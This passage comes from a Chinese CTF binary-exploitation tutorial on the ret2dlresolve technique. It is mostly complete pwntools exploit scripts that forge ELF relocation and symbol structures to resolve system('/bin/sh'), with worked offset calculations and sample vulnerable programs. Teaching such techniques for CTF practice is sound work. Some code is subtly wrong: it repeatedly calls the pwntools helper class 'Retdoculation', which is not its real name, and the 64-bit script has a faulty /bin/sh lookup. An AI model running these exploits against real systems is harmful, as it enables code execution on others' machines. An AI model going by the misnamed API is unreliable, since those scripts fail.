
```text
sym_index   = (伪Sym地址 - .dynsym地址) / 16      ← 必须整除！(伪Sym要"对齐"到 dynsym 数组格点上)
reloc_index = (伪Rel地址 - .rel.plt地址) / 8       ← Elf32_Rel 是 8 字节
st_name     = "system"地址 - .dynstr地址           ← 字节偏移，无对齐要求
```

- **对齐**：伪 Sym 不必 16 字节地址对齐，但 `(伪Sym - dynsym) % 16 == 0` 必须成立，否则解析器读到的 Sym 是"错位"的；布置时先用这个约束定伪 Sym 地址，再围绕它摆其它数据。
- **r_info 低 8 位必须是 7**（JMP_SLOT），否则 `_dl_fixup` 走错分支直接出错。
- **r_offset 必须可写**：解析器会把 system 的真实地址写进去，选一块没人用的 bss 就行（别指向 GOT 里的有效槽位，虽然写坏它通常也没事，但没必要冒险）。

**计算与构造代码（教学版手动构造，32 位）**：

```python
from pwn import *
context(arch='i386', os='linux', log_level='info')
elf = ELF('./pwn')
io  = process('./pwn')

# ---- 各节地址：注意用【sh_addr】(虚拟地址)，不是文件偏移 ----
plt0    = elf.get_section_by_name('.plt').header.sh_addr
relplt  = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym  = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr  = elf.get_section_by_name('.dynstr').header.sh_addr
bss     = elf.bss() + 0x400            # 挑块干净的 bss 高地

# ---- 先定伪 Sym：满足 (伪Sym - dynsym) % 16 == 0 ----
base = bss
base += (dynsym - (base + 0x20)) % 16  # 整块平移，使 +0x20 处的伪Sym落在格点上

sh_addr       = base + 0x00            # "/bin/sh"
fake_rel_addr = base + 0x10
fake_sym_addr = base + 0x20
fake_str_addr = base + 0x30            # "system"

# ---- 三个关键量 ----
sym_index   = (fake_sym_addr - dynsym) // 16
reloc_index = (fake_rel_addr - relplt) // 8
st_name     = fake_str_addr - dynstr
log.info(f'sym_index={sym_index} reloc_index={reloc_index} st_name={st_name}')

# ---- 伪结构体 ----
fake_rel = p32(base + 0x200) + p32((sym_index << 8) | 7)          # r_offset + r_info
fake_sym = p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)

blob  = b'/bin/sh\x00'.ljust(0x10, b'\x00')   # +0x00
blob += fake_rel                              # +0x10
blob += fake_sym                              # +0x20
blob += b'system\x00'                         # +0x30

# ---- 用 read@plt 把 blob 送进 bss，再回 main 准备第二次溢出 ----
read_plt, read_got, main_addr = elf.plt['read'], elf.got['read'], elf.symbols['main']
pppr   = 0x08048509                # pop ebx; pop esi; pop ebp; ret
offset = 0x24

p1  = b'A' * offset
p1 += p32(read_plt) + p32(pppr) + p32(0) + p32(base) + p32(len(blob))
p1 += p32(main_addr)
io.sendlineafter(b'?', p1)
io.send(blob)                      # read@plt 收进 bss

# ---- 第二次溢出：PLT0 + reloc_index 触发伪造解析 ----
p2  = b'A' * offset
p2 += p32(plt0)                    # push link_map; jmp _dl_runtime_resolve
p2 += p32(reloc_index)             # 被当成 "PLT 桩 push 过的下标"
p2 += p32(0xdeadbeef)              # system 的假返回地址
p2 += p32(sh_addr)                 # system("/bin/sh")
io.sendlineafter(b'?', p2)

io.interactive()
```

---

## 8. pwntools 自动化：Retdoculation

### 8.1 一句话介绍

pwntools 把上述所有"算偏移、对齐、拼伪结构体"封装成 `Retdoculation` 类（位于 `pwnlib.rop.ret2dlresolve`，名字是 Ret + _dl_runtime_resolve 的谐音梗），配合 `ROP.ret2dlresolve()` 一键生成触发链。它同时支持 32 位和 64 位（64 位自动处理 RELA、24 字节步长与 versym 问题）。

### 8.2 完整用法示例（32 位）

```python
#!/usr/bin/env python3
# exp_dlresolve_pwntools_32.py
from pwn import *

context(arch='i386', os='linux', log_level='info')
elf = ELF('./pwn')
io  = process('./pwn')

rop = ROP(elf)

# wants 列表 = 要塞进"伪 dynstr"里的字符串：
#   第 1 个是要解析的函数名，其余是参数字符串（如 "/bin/sh"）
dl = Retdoculation(elf, [b'system', b'/bin/sh'])

# 第 0 步（通常需要）：伪结构体必须先落到内存 → 用 read@plt 写到 dl.data_addr
#   dl.data_addr 是 pwntools 自动挑选的可写地址，dl.payload 是构造好的整块数据
rop.call(elf.plt['read'], [0, dl.data_addr, len(dl.payload)])

# 第 1 步：追加 PLT0 + reloc_index 的触发链（参数也会自动布置好）
rop.ret2dlresolve(dl)

io.sendline(rop.chain())     # 发 ROP 链
io.send(dl.payload)          # 紧接着发伪结构体数据，喂给上面的 read@plt

io.interactive()
```

调试时可用这些属性核对：

```python
print(hex(dl.data_addr))     # 伪结构体落点
print(dl.payload.hex())      # 伪 Rel/Sym/字符串的原始字节
print(dl.reloc_index)        # 手算 (伪Rel - .rel.plt) // 8 应与此一致
```

### 8.3 手动构造 vs pwntools 对照表

| 项目 | 手动构造 | pwntools |
|------|---------|----------|
| 伪 Rel/Sym/字符串拼接 | 自己算自己拼 | `dl.payload` 一键生成 |
| 对齐（Sym 落格点） | 手动平移 base | 自动搜索满足约束的 data_addr |
| reloc_index | `(伪Rel-relplt)//8` | `dl.reloc_index` |
| 触发链 | `plt0 + index + fake_ret + arg` | `rop.ret2dlresolve(dl)` |
| 64 位 versym/RELA | 极易翻车 | 自动处理（无解时会报错提示） |
| 学习价值 | 理解原理必经之路 | 实战首选 |

**建议**：手动构造做一遍（配合 gdb 单步 `_dl_fixup`），此后比赛全部用 pwntools——但要看懂它在干什么，遇到奇葩题目还得手工魔改。

---
## 9. 64 位 ret2dlresolve 的额外限制与处理

64 位原理与 32 位完全同构，但结构体和校验细节差异很大，直接套 32 位模板必翻车。

### 9.1 结构差异

| 项目 | 32 位 | 64 位 |
|------|-------|-------|
| 重定位节 | `.rel.plt`（REL） | `.rela.plt`（**RELA**，多一个 r_addend） |
| Rel 条目大小 | 8 字节（r_offset4 + r_info4） | **24 字节**（r_offset8 + r_info8 + r_addend8） |
| r_info 拆分 | 高 24 位 sym_idx，低 8 位 type | **高 32 位 sym_idx，低 32 位 type**（`r_info >> 32` / `r_info & 0xffffffff`） |
| 重定位类型 | R_386_JUMP_SLOT = 7 | R_X86_64_JUMP_SLOT = 7 |
| Sym 条目大小 | 16 字节 | **24 字节** |
| Sym 字段布局 | name4+value4+size4+info1+other1+shndx2 | name4+info1+other1+shndx2+value8+size8 |
| 除数 | `reloc_index=(伪Rel-relplt)/8`，`sym=(伪Sym-dynsym)/16` | `/24` 与 `/24` |

64 位伪结构体：

```python
# 64 位
sym_index   = (fake_sym_addr - dynsym_addr)  // 24          # 必须整除
reloc_index = (fake_rel_addr - rela_plt_addr) // 24         # 必须整除
r_info      = (sym_index << 32) | 7
# Elf64_Sym 24 字节：
fake_sym = p32(st_name) + p8(0x12) + p8(0) + p16(0) + p64(0) + p64(0)
#            4字节        1字节    1字节   2字节     8字节      8字节
fake_rel = p64(r_offset) + p64(r_info) + p64(0)             # 含 r_addend，填 0
```

### 9.2 版本检查（versym）——64 位最大的坑

现代 64 位 gcc 编译的二进制几乎都带 `.gnu.version`（`DT_VERSYM`）。`_dl_fixup` 在查符号前会多走一步：

```c
if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) {
    const uint16_t *vernum = ...;                     /* versym 数组基址 */
    version = &l->l_versions[vernum[sym_index] & 0x7fff];   /* ← 越界读！ */
    if (version->hash == 0) version = NULL;
}
```

问题在于：我们的 `sym_index` 是一个巨大值（伪 Sym 在 bss，离 `.dynsym` 有几十万"格"），`vernum[sym_index]` 这一次 2 字节读**严重越界**。读出来若是垃圾非零值，就会拿它当下标闯进 `l_versions` 数组，随后解引用非法内存 → 直接段错误或 "symbol lookup error"。

**处理方案**：

1. **凑零法（主流）**：精心挑伪 Sym 落点，使得 `versym + 2*sym_index` 恰好指向一段**全零内存**（bss 大片未用区域就是全零），读到 0 → `l_versions[0]` 的 hash 为 0 → `version = NULL`，按无版本符号查找，照样能解析出 `system`。pwntools 的 `Retdoculation` 内部就是在自动搜索满足此约束的 `data_addr`。
2. **无 versym 的二进制**：少数题（老编译器/手动 strip 掉 version 节）没有 `DT_VERSYM`，直接按 32 位思路做即可。
3. **st_other 技巧（了解即可）**：`st_other` 低 2 位（可见性）非 0 时，`_dl_fixup` 走"受保护符号"分支跳过版本检查和符号查找、直接使用 `l_addr + st_value`——常用来绕开 versym 崩溃，但它调用的是**已知地址**（基址+偏移），多用于特殊场合而非解析 libc 未知符号。

### 9.3 其余注意点

- **伪 Sym 读取地址必须已映射可读**：`dynsym + 24*sym_index` 指向 bss 没问题，但算错落点可能指到未映射页，解析器一读就崩。
- **r_offset 落在可写段**：与 32 位一致。
- **参数寄存器**：`_dl_runtime_resolve` 会保存/恢复参数寄存器，所以**先 `pop rdi` 装好 "/bin/sh" 地址再触发解析**，system 一跳回来 rdi 就是对的：
  `... + p64(pop_rdi) + p64(binsh) + p64(plt0) + p64(reloc_index) + p64(fake_ret)`

---

## 10. 前提条件与判定

| 条件 | 原因 | 判定方法 |
|------|------|---------|
| **Partial RELRO 或 No RELRO** | 延迟绑定必须开着；GOT 必须可写（Full RELRO 下 GOT 只读、启动即全解析） | `checksec`：`RELRO: Partial RELRO` ✓ / `Full RELRO` ✗ |
| 动态链接 | 必须存在 `.dynamic`/`.rel.plt`/`.dynsym` 才有"解析"可骗 | `file pwn` 不是 `statically linked` |
| 未开启 BIND_NOW | 与 Full RELRO 等价 | `readelf -d pwn \| grep -E 'BIND_NOW\|FLAGS'` 无输出 |
| 溢出可控返回地址 | 要 ret 到 PLT0 | 老前提 |
| 有办法把伪结构体写进内存 | read/gets/fgets@plt，或溢出空间够大直接把结构体塞栈上（栈地址需已知，No PIE + 泄露 esp） | 看导入函数 |
| 64 位额外：versym 可凑零 | 见 9.2 | pwntools 构造时看有无 warning |

checksec 典型判读：

```text
$ checksec pwn
Arch:     i386-32-little
RELRO:    Partial RELRO      ← 可 ret2dlresolve（若为 Full RELRO 则直接放弃此路线）
Stack:    No canary found    ← 可溢出
NX:       NX enabled         ← 不能上 shellcode
PIE:      No PIE (0x8048000) ← 所有节地址固定，手算偏移可靠
```

> 实战直觉：**看到 Partial RELRO + 无 libc 文件 + 无 system@plt，条件反射想 ret2dlresolve**；如果溢出长度还小，就是"dlresolve + 栈迁移"套餐。

---

## 11. 变体与扩展

### 11.1 ret2dlresolve + 栈迁移（溢出长度不足）

```text
溢出只有 0x20 字节（放不下 read+plt0 整条链）时：

第 1 段（栈上，塞得下即可）              第 2 段（bss 上，随意长）
+--------------------+                bss_pivot:
| padding            |                [完整 ROP 链：read 伪结构体]
| read@plt           |                [pop rdi; binsh]
| pppr               |                [PLT0][reloc_index][fake_ret]
| 0                  |                    ▲
| bss_pivot          |                    │
| 0x400              |                    │
| pop ebp; ret       | ← ebp = bss_pivot  │
| bss_pivot          |                    │
| leave; ret         | ── esp = ebp ──────┘ 迁移后从 bss 继续执行
+--------------------+
```

```python
# 第 1 段：把长链读进 bss 并迁移过去
p1 = b'A' * offset
p1 += p32(read_plt) + p32(pppr) + p32(0) + p32(bss_pivot) + p32(0x400)
p1 += p32(pop_ebp_ret) + p32(bss_pivot)
p1 += p32(leave_ret)
io.send(p1)
io.send(p2_full_chain.ljust(0x400, b'\x00'))   # read@plt 读入并"落地"
```

### 11.2 dlresolve 解析不常见函数

`Retdoculation(elf, wants)` 的第一个字符串就是**任意 libc 导出符号**：

- `execve`：配合 CSU 凑齐 rsi/rdx（`execve("/bin/sh", 0, 0)`），见 07 章 ret2csu；
- `gets`/`fgets`：解析出来后再开一轮无限注入；
- `printf`+格式串、`mprotect`+shellcode 等，思路相同——**解析哪个函数由 payload 里那个字符串决定**。

### 11.3 与 ret2csu 配合

64 位下 dlresolve 链经常需要 `rdi/rsi/rdx` 三件套（例如先 `read` 伪结构体），而 `pop rdx` 罕见——标准解法是借 `__libc_csu_init` 的两段 gadget 传参（详见 07 章）。顺序通常是：`csu 调 read 落伪结构体 → pop rdi 装参 → PLT0 触发`。

---

## 12. 典型例题（ret2dlresolve）

### 例题 3：32 位经典 ret2dlresolve（手算 reloc 偏移全过程）

**题目源码（伪 C）**

```c
// gcc -m32 -no-pie -fno-stack-protector -o pwn pwn.c
#include <stdio.h>
#include <unistd.h>

int vuln(void) {
    char buf[0x20];
    return read(0, buf, 0x100);        // 0x20 缓冲读 0x100 → 溢出 0xE0，链够长
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    write(1, "dl> ", 4);
    vuln();
    return 0;
}
```

**checksec**

```text
Arch:     i386-32-little
RELRO:    Partial RELRO        ← 延迟绑定开着，ret2dlresolve 成立
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

**思路**：无 libc 文件、无 `system@plt`、程序只有 `read/write`——教科书式 dlresolve。分两步：先用 `read@plt` 把伪结构体送进 bss；同一条链的尾部直接接 PLT0 触发伪造解析。

**手算偏移**（示例数值，实际以本机 readelf 输出为准）：

```text
.dynsym   = 0x080481CC
.dynstr   = 0x0804826C
.rel.plt  = 0x08048350
.plt(PLT0)= 0x08048400
bss 起始   = 0x0804A500（选一块干净区域）

① 伪 Sym 落格点：(伪Sym - 0x080481CC) % 16 == 0
   即 伪Sym ≡ 0xC (mod 16)，取 伪Sym = 0x0804A51C          ✓ (0x0804A51C-0x080481CC=0x2350, %16=0)
② 伪 Rel 落格点：(伪Rel - 0x08048350) % 8 == 0
   且在伪 Sym (0x0804A51C+0x10=0x0804A52C) 之后，取 伪Rel = 0x0804A530   ✓ (0x21E0 % 8 = 0)
③ sym_index   = (0x0804A51C - 0x080481CC) / 16 = 0x2350/16 = 0x235
④ reloc_index = (0x0804A530 - 0x08048350) / 8  = 0x21E0/8  = 0x43C   ← 除数是 8！
⑤ "system" 放 0x0804A538，st_name = 0x0804A538 - 0x0804826C = 0x22CC
```

**完整 exp（手动构造教学版）**

```python
#!/usr/bin/env python3
from pwn import *

context(arch='i386', os='linux', log_level='info')
elf = ELF('./pwn')
io  = process('./pwn')

plt0   = elf.get_section_by_name('.plt').header.sh_addr      # 0x08048400
relplt = elf.get_section_by_name('.rel.plt').header.sh_addr  # 0x08048350
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr   # 0x080481CC
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr   # 0x0804826C

region  = 0x0804A500
sh_addr = region + 0x00

# 伪 Sym：向上找到第一个满足 (addr-dynsym)%16==0 的地址
fake_sym_addr = region + 0x10
fake_sym_addr += (-(fake_sym_addr - dynsym)) % 16            # → 0x0804A51C
# 伪 Rel：跟在伪 Sym 后，向上找到 (addr-relplt)%8==0 的地址
fake_rel_addr = fake_sym_addr + 0x10
fake_rel_addr += (-(fake_rel_addr - relplt)) % 8             # → 0x0804A530
fake_str_addr = fake_rel_addr + 8                            # → 0x0804A538 "system"

sym_index   = (fake_sym_addr - dynsym) // 16                 # 0x235
reloc_index = (fake_rel_addr - relplt) // 8                  # 0x43C
st_name     = fake_str_addr - dynstr                         # 0x22CC
log.info(f'sym_index={sym_index:#x} reloc_index={reloc_index:#x} st_name={st_name:#x}')

fake_rel = p32(region + 0x200) + p32((sym_index << 8) | 7)   # r_offset(可写) + r_info
fake_sym = p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)

# 按地址差拼 blob（元素之间用 padding 补齐到各自落点）
blob  = b'/bin/sh\x00'                                       # region+0x00
blob  = blob.ljust(fake_sym_addr - region, b'A') + fake_sym  # +0x1C
blob  = blob.ljust(fake_rel_addr - region, b'A') + fake_rel  # +0x30
blob += b'system\x00'                                        # +0x38

read_plt = elf.plt['read']
pppr     = 0x08048509            # pop ebx; pop esi; pop ebp; ret
offset   = 0x24                  # buf(0x20) + saved ebp(4)

p  = b'A' * offset
p += p32(read_plt) + p32(pppr) + p32(0) + p32(region) + p32(len(blob))  # 送伪结构体
p += p32(plt0) + p32(reloc_index) + p32(0xdeadbeef) + p32(sh_addr)      # 触发解析→system
io.sendafter(b'dl> ', p)
io.send(blob)                    # 喂给链上的 read@plt

io.interactive()
```

**pwntools 等价 exp（比赛实战版）**

```python
from pwn import *
context(arch='i386', log_level='info')
elf = ELF('./pwn')
io  = process('./pwn')

rop = ROP(elf)
dl  = Retdoculation(elf, [b'system', b'/bin/sh'])
rop.call(elf.plt['read'], [0, dl.data_addr, len(dl.payload)])
rop.ret2dlresolve(dl)
io.sendlineafter(b'dl> ', rop.chain())
io.send(dl.payload)
io.interactive()
```

### 例题 4：64 位 ret2dlresolve（CSU 传参 + versym 处理）

**题目源码（伪 C）**

```c
// gcc -m64 -no-pie -fno-stack-protector -o pwn64 pwn64.c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char buf[0x20];
    setvbuf(stdout, NULL, _IONBF, 0);
    write(1, "64dl> ", 6);
    read(0, buf, 0x200);           // 溢出 0x1E0，链放得下
    return 0;
}
```

**checksec**

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

**思路**：64 位链需要 rdi/rsi/rdx 才能先调 `read` 落伪结构体——用 `__libc_csu_init` 两段 gadget；随后 `pop rdi` 装参数、PLT0 触发。versym 问题交给 pwntools 自动凑零（它的 `dl.data_addr` 已保证 versym 越界读全为 0）。

**完整 exp**

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')
elf = ELF('./pwn64')
io  = process('./pwn64')

read_got = elf.got['read']
plt0     = elf.get_section_by_name('.plt').header.sh_addr

# __libc_csu_init 两段 gadget（详见 07 章；ROPgadget --binary pwn64 可核对）
csu_pop  = 0x40088A   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x400870   # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]
pop_rdi  = 0x400893   # pop rdi; ret

rop = ROP(elf)
dl  = Retdoculation(elf, [b'system', b'/bin/sh'])

# —— 用 csu 调 read(0, dl.data_addr, len(dl.payload))：rbx=0, rbp=1 ——
rop.raw(csu_pop)
rop.raw([0, 1, read_got, len(dl.payload), dl.data_addr, 0])   # rbx,rbp,r12,r13(rdx),r14(rsi),r15(edi)
rop.raw(csu_call)
rop.raw(b'\x00' * 56)        # csu_call 尾部 add rsp,8; pop rbx,rbp,r12,r13,r14,r15 清栈
# —— pop rdi 装参数，再触发伪造解析：system("/bin/sh") ——
rop.raw(pop_rdi)
rop.raw(next(elf.search(b'/bin/sh\x00')) if b'/bin/sh\x00' in elf.search(b'/bin/sh\x00') else dl.data_addr + dl.payload.index(b'/bin/sh'))
rop.raw(plt0)
rop.raw(dl.reloc_index)      # 可手验：(伪Rel - .rela.plt) // 24
rop.raw(0xdeadbeef)          # system 的假返回地址

io.sendafter(b'64dl> ', rop.chain())
io.send(dl.payload)          # 喂给 csu 里的 read@plt
io.interactive()
```

**手算 64 位 reloc 偏移的公式与自检**：

```text
rela_plt = .rela.plt 首地址；dynsym = .dynsym 首地址
伪Rel 必须满足 (伪Rel - rela_plt) % 24 == 0
伪Sym 必须满足 (伪Sym - dynsym)   % 24 == 0
reloc_index = (伪Rel - rela_plt) // 24
sym_index   = (伪Sym - dynsym)   // 24
r_info      = (sym_index << 32) | 7
自检：dl.reloc_index 应与手算 reloc_index 完全一致
```

---

## 13. 常见坑

| # | 坑 | 症状 | 排查/规避 |
|---|----|------|----------|
| 1 | **伪结构体未对齐**：`(伪Sym - dynsym) % 16(或24) != 0` | 解析出错误符号/段错误 | 手算时先定 Sym 再摆其它；用 `dl.reloc_index` 对照 |
| 2 | **字符串没以 `\x00` 结尾**：`"system"` 后面没补零，或 blob 用 `sendline` 被换行污染 | 查出来的名字变成 "system\x.." → 符号不存在 | 每个 C 字符串手动补 `\x00`；`"system\x00"` 一定写全 |
| 3 | **reloc_index 除数用错**：32 位 `Elf32_Rel` 是 **8** 字节（不是 16！），64 位 `Elf64_Rela` 是 **24** 字节 | 崩溃或解析到乱七八糟的表项 | 背公式：`/8`（32）`/24`（64）；Sym 是 `/16`、`/24` |
| 4 | **64 位 versym 越界**：`.gnu.version` 存在且伪 Sym 落点没凑零 | 段错误或 `symbol lookup error: version not found` | 换 `dl.data_addr`（pwntools 已凑零）；或确认二进制无 DT_VERSYM |
| 5 | **`sendline` 多余字节**：`sendline(blob)` 附加的 `\n` 被下一次 `read` 吃掉，破坏后续数据 | 第二阶段莫名错位 | 结构体/精确长度数据一律 `send`；只有面向 `scanf/gets` 的才考虑 `sendline` |
| 6 | **节地址用错**：拿了 `sh_offset`（文件偏移）当 `sh_addr`（虚拟地址）用 | index 算出来天文数字/负数 | 一律 `get_section_by_name(...).header.sh_addr` |
| 7 | **r_info 类型字节错**：低 8 位不是 7，或 64 位忘了 `sym_index << 32` | 走错解析分支直接崩 | 32 位 `(idx<<8)\|7`，64 位 `(idx<<32)\|7` |
| 8 | **r_offset 不可写**：解析结果往只读段写 | 解析成功但写入即崩 | 挑 bss 空白区（如 `elf.bss()+0x200`） |
| 9 | **Full RELRO 还硬上** | 根本没有延迟绑定，payload 永远失败 | 先看 checksec，Full RELRO 直接换 05 章路线 |
| 10 | **32 位 PLT0/桩混淆**：把 `write@plt` 当成 PLT0 触发解析 | 只会调到 write，不解析 | 触发解析必须 ret 到 **PLT0**（`.plt` 节首地址），不是任何函数桩 |

---

## 14. 本章检查清单

**ret2plt**

- [ ] checksec 确认：无 canary、偏移已用 `cyclic` 实测
- [ ] 32 位：函数地址后紧跟"假返回地址（pppr）+ 按序参数"；64 位：先摆 `pop rdi/rsi/rdx` gadget 再放函数地址
- [ ] 泄露用 `write@plt`（32 位首选）或 `puts@plt`（64 位首选），接收时 `u32(io.recv(4))` / `u64(recv(6).ljust(8,0))`
- [ ] 泄露目标选已调用过的函数 GOT（`read/puts/__libc_start_main`）
- [ ] 写内存用 `read@plt`/`gets@plt`，目标选 bss 空白区，字符串带 `\x00`
- [ ] 链尾放 `main` 返场；长度不够就改自循环 read + 栈迁移

**ret2dlresolve**

- [ ] `RELRO` 为 Partial/No，未开 BIND_NOW
- [ ] 所有节地址取 `sh_addr`；伪 Sym 落格点（`/16` 或 `/24` 整除）
- [ ] reloc_index 除数正确（32 位 `/8`，64 位 `/24`），并与 `dl.reloc_index` 互相验证
- [ ] `r_info` 类型为 7；64 位记得 `sym_index << 32`
- [ ] 伪字符串均 `\x00` 结尾；发送用 `send`
- [ ] 64 位：确认 versym 凑零（或无 DT_VERSYM）；参数寄存器（`pop rdi`）在触发解析前装好
- [ ] 溢出长度不足时：先 `read + leave;ret` 迁移，再上完整链

---

## 相关阅读

- [04-ret2syscall.md](04-ret2syscall.md)：同为"不依赖 libc"的技术，`int 0x80` 与 gadget 搜索思想相通，64 位传参 gadget 表可直接复用。
- [05-ret2libc.md](05-ret2libc.md)：ret2plt 泄露后的标准下一步；libc 基址计算、LibcSearcher 与 libc 数据库详解。
- [07-ROP高级技巧.md](07-ROP高级技巧.md)：ret2csu（64 位凑 rdx）、栈迁移 pivot、`__libc_csu_init` gadget 全解——dlresolve + 迁移套餐的另一半。
- [README.md](README.md)：知识库总览与阅读路线。
